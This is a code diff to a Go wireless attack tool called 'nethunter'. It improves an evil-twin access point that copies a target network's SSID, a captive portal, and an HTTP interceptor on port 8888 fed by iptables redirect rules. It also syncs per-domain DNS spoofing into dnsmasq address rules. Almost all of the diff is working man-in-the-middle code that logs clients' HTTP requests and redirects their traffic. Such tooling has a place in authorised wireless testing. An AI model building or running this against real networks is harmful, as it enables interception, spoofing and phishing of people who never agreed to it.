@@ -8,6 +8,7 @@ import (
 	"io"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -42,6 +43,7 @@ var (
 	internetInterface  = ""
 	ifaceManagedByNM   = false
 	dnsmasqLeasesPath  = ""
+	dnsmasqExtraPath   = ""
 	blockedSites       = []string{}
 	dnsSpoof           = make(map[string]string)
 	injectedJS         = ""
@@ -335,7 +337,13 @@ func createFakeLAN() {
 	go monitorClients(iface)
 
 	if provideInternet {
-		go startHTTPProxy()
+		if err := startHTTPProxy(); err != nil {
+			fmt.Printf("%s[!] HTTP interceptor: %v%s\n", utils.Yellow, err, utils.Reset)
+		} else if runtime.GOOS != "windows" {
+			if err := applyEvilTwinIptables(iface); err != nil {
+				fmt.Printf("%s[!] iptables redirect: %v%s\n", utils.Yellow, err, utils.Reset)
+			}
+		}
 	}
 
 	displayDashboard(false)
@@ -456,9 +464,25 @@ func launchEvilTwin() {
 	}
 
 	if mode == "captive" {
-		go startCaptivePortal(targetNetwork.SSID)
+		if err := startCaptivePortalListen(targetNetwork.SSID); err != nil {
+			fmt.Printf("%s[!] Captive portal failed to bind: %v%s\n", utils.Red, err, utils.Reset)
+			stopAP()
+			utils.PauseForInput()
+			return
+		}
 	} else {
-		go startHTTPProxy()
+		if err := startHTTPProxy(); err != nil {
+			fmt.Printf("%s[!] HTTP interceptor failed: %v%s\n", utils.Red, err, utils.Reset)
+			stopAP()
+			utils.PauseForInput()
+			return
+		}
+	}
+
+	if runtime.GOOS != "windows" {
+		if err := applyEvilTwinIptables(iface); err != nil {
+			fmt.Printf("%s[!] iptables: %v (HTTP may not reach this host)%s\n", utils.Yellow, err, utils.Reset)
+		}
 	}
 
 	fmt.Printf("\n%s[✓] Evil Twin '%s' is active!%s\n", utils.Green, targetNetwork.SSID, utils.Reset)
@@ -744,6 +768,12 @@ func startFakeLANLinux(config APConfig) {
 		return
 	}
 
+	dnsmasqExtraPath = sessionLogPath("dnsmasq-extra.conf")
+	if err := os.WriteFile(dnsmasqExtraPath, []byte("# nethunter — per-domain overrides (see syncDnsmasqAddressRules)\n"), 0644); err != nil {
+		fmt.Printf("%s[!] Failed to init dnsmasq extra conf: %v%s\n", utils.Red, err, utils.Reset)
+		return
+	}
+
 	dnsmasqConf := `
 interface=` + config.Interface + `
 bind-interfaces
@@ -755,6 +785,7 @@ dhcp-option=6,10.0.0.1
 server=8.8.8.8
 log-queries
 log-dhcp
+conf-file=` + dnsmasqExtraPath + `
 address=/#/10.0.0.1
 dhcp-option=114,http://10.0.0.1/
 `
@@ -808,6 +839,8 @@ dhcp-option=114,http://10.0.0.1/
 		return
 	}
 
+	syncDnsmasqAddressRules()
+
 	if config.ProvideInternet {
 		if err := configureInternetSharing(config.Interface); err != nil {
 			fmt.Printf("%s[!] Internet sharing not enabled: %v%s\n", utils.Red, err, utils.Reset)
@@ -835,56 +868,52 @@ func startEvilTwinLinux(config EvilTwinConfig) {
 		Password:        config.Password,
 		ProvideInternet: config.ProvideInternet,
 	})
-
-	if !apRunning {
-		return
-	}
-
-	if err := ensureIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", config.Interface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "8888"}); err != nil {
-		fmt.Printf("%s[!] Failed to set HTTP redirect rule: %v%s\n", utils.Red, err, utils.Reset)
-	} else {
-		redirectConfigured = true
-	}
-
-	if config.Mode != "captive" {
-		if err := ensureIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", config.Interface, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "8888"}); err != nil {
-			fmt.Printf("%s[!] Failed to set HTTPS redirect rule: %v%s\n", utils.Red, err, utils.Reset)
-		} else {
-			redirectConfigured = true
-		}
-	}
 }
 
-func startHTTPProxy() {
+func applyEvilTwinIptables(apIface string) error {
+	if err := ensureIptablesRedirectFirst(apIface, "80", "8888"); err != nil {
+		return fmt.Errorf("HTTP redirect: %w", err)
+	}
+	redirectConfigured = true
+	return nil
+}
+
+func startHTTPProxy() error {
 	processMu.Lock()
 	if proxyServer != nil {
 		processMu.Unlock()
-		return
+		return nil
+	}
+	processMu.Unlock()
+
+	ln, err := net.Listen("tcp", "0.0.0.0:8888")
+	if err != nil {
+		return err
 	}
 
 	mux := http.NewServeMux()
 	mux.HandleFunc("/", handleProxyRequest)
+	srv := &http.Server{Handler: mux}
 
-	srv := &http.Server{
-		Addr:    ":8888",
-		Handler: mux,
-	}
+	processMu.Lock()
 	proxyServer = srv
 	processMu.Unlock()
 
-	if err := srv.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
-		fmt.Printf("%s[!] HTTP proxy stopped: %v%s\n", utils.Red, err, utils.Reset)
-	}
-
-	processMu.Lock()
-	if proxyServer == srv {
-		proxyServer = nil
-	}
-	processMu.Unlock()
+	go func() {
+		if err := srv.Serve(ln); err != nil && !errors.Is(err, http.ErrServerClosed) {
+			fmt.Printf("%s[!] HTTP proxy stopped: %v%s\n", utils.Red, err, utils.Reset)
+		}
+		processMu.Lock()
+		if proxyServer == srv {
+			proxyServer = nil
+		}
+		processMu.Unlock()
+	}()
+	return nil
 }
 
 func handleProxyRequest(w http.ResponseWriter, r *http.Request) {
-	clientIP := strings.Split(r.RemoteAddr, ":")[0]
+	clientIP := clientIPFromRequest(r)
 	clientMAC := getClientMACByIP(clientIP)
 
 	logHTTPRequest(clientIP, r)
@@ -893,6 +922,9 @@ func handleProxyRequest(w http.ResponseWriter, r *http.Request) {
 	if host == "" {
 		host = r.URL.Host
 	}
+	if i := strings.Index(host, ":"); i >= 0 {
+		host = host[:i]
+	}
 
 	if isBlocked(host, clientMAC) {
 		w.WriteHeader(http.StatusForbidden)
@@ -900,10 +932,11 @@ func handleProxyRequest(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	spoofedIP := checkDNSSpoof(host, clientMAC)
-	if spoofedIP != "" {
-		http.Redirect(w, r, "http://"+spoofedIP, http.StatusFound)
-		return
+	if dest := checkDNSSpoof(host, clientMAC); dest != "" {
+		if u := normalizeSpoofRedirectURL(dest); u != "" {
+			http.Redirect(w, r, u, http.StatusFound)
+			return
+		}
 	}
 
 	if r.URL.Scheme == "" {
@@ -1279,11 +1312,17 @@ func getHostnameFromIP(ip string) string {
 	return strings.TrimSuffix(names[0], ".")
 }
 
-func startCaptivePortal(ssid string) {
+func startCaptivePortalListen(ssid string) error {
 	processMu.Lock()
 	if captiveServer != nil {
 		processMu.Unlock()
-		return
+		return nil
+	}
+	processMu.Unlock()
+
+	ln, err := net.Listen("tcp", "0.0.0.0:8888")
+	if err != nil {
+		return err
 	}
 
 	mux := http.NewServeMux()
@@ -1291,7 +1330,7 @@ func startCaptivePortal(ssid string) {
 		mux.HandleFunc(path, makeCaptiveProbeHandler())
 	}
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		clientIP := strings.Split(r.RemoteAddr, ":")[0]
+		clientIP := clientIPFromRequest(r)
 		logHTTPRequest(clientIP, r)
 		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
 		w.Header().Set("Pragma", "no-cache")
@@ -1334,22 +1373,23 @@ func startCaptivePortal(ssid string) {
 		}
 	})
 
-	srv := &http.Server{
-		Addr:    ":8888",
-		Handler: mux,
-	}
+	srv := &http.Server{Handler: mux}
+
+	processMu.Lock()
 	captiveServer = srv
 	processMu.Unlock()
 
-	if err := srv.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
-		fmt.Printf("%s[!] Captive portal stopped: %v%s\n", utils.Red, err, utils.Reset)
-	}
-
-	processMu.Lock()
-	if captiveServer == srv {
-		captiveServer = nil
-	}
-	processMu.Unlock()
+	go func() {
+		if err := srv.Serve(ln); err != nil && !errors.Is(err, http.ErrServerClosed) {
+			fmt.Printf("%s[!] Captive portal stopped: %v%s\n", utils.Red, err, utils.Reset)
+		}
+		processMu.Lock()
+		if captiveServer == srv {
+			captiveServer = nil
+		}
+		processMu.Unlock()
+	}()
+	return nil
 }
 
 func captiveProbePaths() []string {
@@ -1360,18 +1400,19 @@ func captiveProbePaths() []string {
 		"/library/test/success.html",
 		"/success.txt",
 		"/connecttest.txt",
-		"/ncsi.txt",
 		"/redirect",
+		"/ncsi.txt",
 		"/canonical.html",
 		"/mobile/status.php",
 		"/kindle-wifi/wifistub.html",
 		"/fwlink",
+		"/captiveportal/generate_204",
 	}
 }
 
 func makeCaptiveProbeHandler() http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
-		clientIP := strings.Split(r.RemoteAddr, ":")[0]
+		clientIP := clientIPFromRequest(r)
 		logHTTPRequest(clientIP, r)
 		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
 		w.Header().Set("Pragma", "no-cache")
@@ -1733,9 +1774,10 @@ func configureDNSSpoof() {
 	rulesMutex.Unlock()
 
 	if applyToAll {
-		fmt.Printf("\n%s[✓] DNS Spoof (all): %s → %s%s\n", utils.Green, domain, redirectTo, utils.Reset)
+		syncDnsmasqAddressRules()
+		fmt.Printf("\n%s[✓] DNS Spoof (all): %s → %s (dnsmasq + HTTP layer)%s\n", utils.Green, domain, redirectTo, utils.Reset)
 	} else {
-		fmt.Printf("\n%s[✓] DNS Spoof (%s): %s → %s%s\n", utils.Green, mac, domain, redirectTo, utils.Reset)
+		fmt.Printf("\n%s[✓] DNS Spoof (%s): %s → %s (HTTP :80 interceptor only; per-client DNS needs dhcp tags)%s\n", utils.Green, mac, domain, redirectTo, utils.Reset)
 	}
 
 	utils.PauseForInput()
@@ -2142,6 +2184,7 @@ func removeDNSSpoofRule() {
 		rulesMutex.Lock()
 		delete(dnsSpoof, domain)
 		rulesMutex.Unlock()
+		syncDnsmasqAddressRules()
 		fmt.Printf("%s[✓] Removed global DNS spoof rule: %s%s\n", utils.Green, domain, utils.Reset)
 
 	case "2":
@@ -2600,6 +2643,7 @@ func stopAP() {
 	apInterface = ""
 	ifaceManagedByNM = false
 	dnsmasqLeasesPath = ""
+	dnsmasqExtraPath = ""
 	natConfigured = false
 	redirectConfigured = false
 
@@ -2689,9 +2733,116 @@ func cleanupEvilTwinRedirect(apIface string) {
 		return
 	}
 
-	deleteIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", apIface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "8888"})
-	deleteIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", apIface, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "8888"})
+	deleteIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", apIface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", "8888"})
+	deleteIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", apIface, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-ports", "8888"})
 	redirectConfigured = false
+}
+
+func ensureIptablesRedirectFirst(apIface, dport, toPorts string) error {
+	tail := []string{"-i", apIface, "-p", "tcp", "--dport", dport, "-j", "REDIRECT", "--to-ports", toPorts}
+	full := append([]string{"-t", "nat", "PREROUTING"}, tail...)
+	if err := exec.Command("iptables", append([]string{"-C"}, full...)...).Run(); err == nil {
+		return nil
+	}
+	insert := append([]string{"-t", "nat", "-I", "PREROUTING", "1"}, tail...)
+	return exec.Command("iptables", insert...).Run()
+}
+
+func clientIPFromRequest(r *http.Request) string {
+	if r == nil {
+		return ""
+	}
+	host, _, err := net.SplitHostPort(r.RemoteAddr)
+	if err != nil {
+		return strings.TrimPrefix(strings.TrimSuffix(r.RemoteAddr, "]"), "[")
+	}
+	return host
+}
+
+func normalizeSpoofRedirectURL(target string) string {
+	target = strings.TrimSpace(target)
+	if target == "" {
+		return ""
+	}
+	if strings.Contains(target, "://") {
+		if u, err := url.Parse(target); err == nil && u.Scheme != "" && u.Host != "" {
+			return u.String()
+		}
+		return target
+	}
+	if net.ParseIP(target) != nil {
+		return "http://" + target
+	}
+	return "http://" + target
+}
+
+func resolveSpoofTargetToIP(target string) string {
+	target = strings.TrimSpace(target)
+	if target == "" {
+		return ""
+	}
+	if ip := net.ParseIP(target); ip != nil {
+		return ip.String()
+	}
+	if strings.Contains(target, "://") {
+		if u, err := url.Parse(target); err == nil && u.Hostname() != "" {
+			target = u.Hostname()
+		}
+	}
+	if ip := net.ParseIP(target); ip != nil {
+		return ip.String()
+	}
+	addrs, err := net.LookupHost(target)
+	if err != nil || len(addrs) == 0 {
+		return ""
+	}
+	for _, a := range addrs {
+		if ip := net.ParseIP(a); ip != nil && ip.To4() != nil {
+			return ip.String()
+		}
+	}
+	return addrs[0]
+}
+
+func syncDnsmasqAddressRules() {
+	if dnsmasqExtraPath == "" {
+		return
+	}
+	var b strings.Builder
+	b.WriteString("# nethunter — generated; global DNS spoof → address=\n")
+	rulesMutex.RLock()
+	keys := make([]string, 0, len(dnsSpoof))
+	for d := range dnsSpoof {
+		keys = append(keys, d)
+	}
+	sort.Strings(keys)
+	for _, domain := range keys {
+		target := dnsSpoof[domain]
+		dom := strings.TrimSpace(strings.TrimPrefix(domain, "."))
+		if dom == "" {
+			continue
+		}
+		ip := resolveSpoofTargetToIP(target)
+		if ip == "" {
+			continue
+		}
+		fmt.Fprintf(&b, "address=/%s/%s\n", dom, ip)
+		if !strings.HasPrefix(strings.ToLower(dom), "www.") {
+			fmt.Fprintf(&b, "address=/www.%s/%s\n", dom, ip)
+		}
+	}
+	rulesMutex.RUnlock()
+	_ = os.WriteFile(dnsmasqExtraPath, []byte(b.String()), 0644)
+	reloadDnsmasq()
+}
+
+func reloadDnsmasq() {
+	processMu.Lock()
+	cmd := dnsmasqCmd
+	processMu.Unlock()
+	if cmd != nil && cmd.Process != nil {
+		_ = cmd.Process.Signal(syscall.SIGHUP)
+	}
 }
 
 func ensureIptablesRule(ruleSpec []string) error {
